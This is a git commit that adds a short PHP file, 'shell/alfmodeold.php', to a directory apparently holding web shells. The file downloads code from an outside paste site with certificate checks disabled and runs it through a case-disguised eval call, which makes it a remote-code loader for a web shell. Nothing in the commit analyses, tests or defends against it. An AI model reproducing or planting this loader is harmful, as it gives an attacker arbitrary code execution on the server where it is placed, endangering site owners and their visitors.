548722b02396dec6294bd641c39714b6ad94ea30
xxTYPOxx <linksitegacor@gmail.com>
2024-11-19 08:40:58 +0700

    Create alfmodeold.php

---
+++ shell/alfmodeold.php
@@ -0,0 +1,14 @@
+<?php
+function getURLS($url) {
+    if(function_exists('curl_version')) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_HEADER, 0);
+        $data = curl_exec($ch);
+        curl_close($ch);
+        return $data;
+    }
+}
+EvAl("?>" . getURLS("https://paste.myconan.net/507807-2b34683a.txt"));
